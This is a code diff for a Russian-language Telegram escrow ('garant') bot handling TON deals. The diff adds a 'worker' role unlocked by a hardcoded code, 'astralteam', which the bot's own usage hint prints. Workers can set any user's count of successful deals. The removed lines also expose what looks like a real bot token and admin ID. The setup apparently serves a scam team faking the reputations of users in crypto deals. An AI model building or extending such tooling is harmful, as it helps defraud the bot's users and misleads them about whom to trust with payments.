@@ -20,9 +20,14 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # Конфигурация бота
-BOT_TOKEN = "8533478970:AAFLJ2aG3ip32Htuh5GwSQpaEs1_kUWGbAw"  # Замените на ваш токен
-ADMIN_ID = 7074282438  # ID администратора
+BOT_TOKEN = "TOKEN"  # Замените на ваш токен
+ADMIN_ID = 0  # ID администратора
 VALUTE = "TON"  # По умолчанию валюта - TON
+
+# Воркеры (работники бота)
+WORKERS = set()  # сюда добавляем ID воркеров
+WORKER_CODE = "astralteam"  # код, который нужно ввести в /astralteam
+
 
 # Хранение данных
 user_data = {}  # Данные пользователей: {user_id: {'wallet': 'адрес', 'balance': float, 'successful_deals': int, 'lang': 'ru'}}
@@ -135,6 +140,25 @@ def ensure_user_exists(user_id):
         user_data[user_id] = {'wallet': '', 'balance': 0.0, 'successful_deals': 0, 'lang': 'ru'}
         save_user_data(user_id)
 
+
+async def worker_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Команда /astralteam <код> для выдачи прав воркера."""
+    user_id = update.message.from_user.id if update.message else None
+    args = context.args if hasattr(context, "args") else []
+
+    if user_id is None:
+        return
+
+    if not args:
+        await update.message.reply_text("Введите команду так: /astralteam astralteam")
+        return
+
+    if args[0] == WORKER_CODE:
+        WORKERS.add(user_id)
+        await update.message.reply_text("Вы добавлены как воркер. Доступ к панели активирован.")
+    else:
+        await update.message.reply_text("Неверный код доступа.")
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         # Получаем user_id в зависимости от типа обновления
@@ -200,6 +224,14 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
             await context.bot.send_message(chat_id, get_text(lang, "admin_panel_message"), reply_markup=reply_markup)
+        elif user_id in WORKERS:
+            # Панель для воркеров
+            keyboard = [
+                [InlineKeyboardButton("Изменить успешные сделки", callback_data='worker_change_deals')],
+                [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')],
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await context.bot.send_message(chat_id, "Панель воркера:", reply_markup=reply_markup)
         else:
             # Обычное меню для пользователей
             keyboard = [
@@ -273,7 +305,7 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data['awaiting_amount'] = True  # Устанавливаем флаг ожидания суммы
 
         elif data == 'referral':
-            referral_link = f"https://t.me/GltfEIfbot?start={user_id}"
+            referral_link = f"https://t.me/astralgarant_bot?start={user_id}"
             await context.bot.send_message(
                 chat_id,
                 get_text(lang, "referral_message", referral_link=referral_link, valute=VALUTE),
@@ -317,6 +349,11 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if user_id == ADMIN_ID:
                 await query.edit_message_text(get_text(lang, "admin_change_valute_message"))
                 admin_commands[user_id] = 'change_valute'
+
+        elif data == 'worker_change_deals':
+            if user_id in WORKERS:
+                await query.edit_message_text("Введите ID пользователя и количество успешных сделок через пробел:")
+                admin_commands[user_id] = 'worker_change_successful_deals'
 
         # Обработка оплаты с баланса
         elif data.startswith('pay_from_balance_'):
@@ -416,6 +453,19 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(f"Валюта изменена на {VALUTE}.")
             admin_commands[user_id] = None
 
+        elif user_id in WORKERS and admin_commands.get(user_id) == 'worker_change_successful_deals':
+            try:
+                target_user_id, new_successful_deals = map(str.strip, text.split())
+                target_user_id = int(target_user_id)
+                new_successful_deals = int(new_successful_deals)
+                ensure_user_exists(target_user_id)
+                user_data[target_user_id]['successful_deals'] = new_successful_deals
+                save_user_data(target_user_id)
+                await update.message.reply_text(f"Количество успешных сделок пользователя {target_user_id} изменено на {new_successful_deals}.")
+            except Exception:
+                await update.message.reply_text("Неверный формат. Введите: user_id количество")
+            admin_commands[user_id] = None
+
         elif context.user_data.get('awaiting_amount', False):
             try:
                 context.user_data['amount'] = float(text)
@@ -441,7 +491,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data.clear()
            
             await update.message.reply_text(
-                get_text(lang, "deal_created_message", amount=deals[deal_id]['amount'], valute=VALUTE, description=deals[deal_id]['description'], deal_link=f"https://t.me/GltfEIfbot?start={deal_id}"),
+                get_text(lang, "deal_created_message", amount=deals[deal_id]['amount'], valute=VALUTE, description=deals[deal_id]['description'], deal_link=f"https://t.me/astralgarant_bot?start={deal_id}"),
                 reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
             )
             # Уведомление админу
@@ -480,6 +530,7 @@ def main() -> None:
 
     # Регистрация обработчиков
     application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("astralteam", worker_login))
     application.add_handler(CallbackQueryHandler(button))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
 
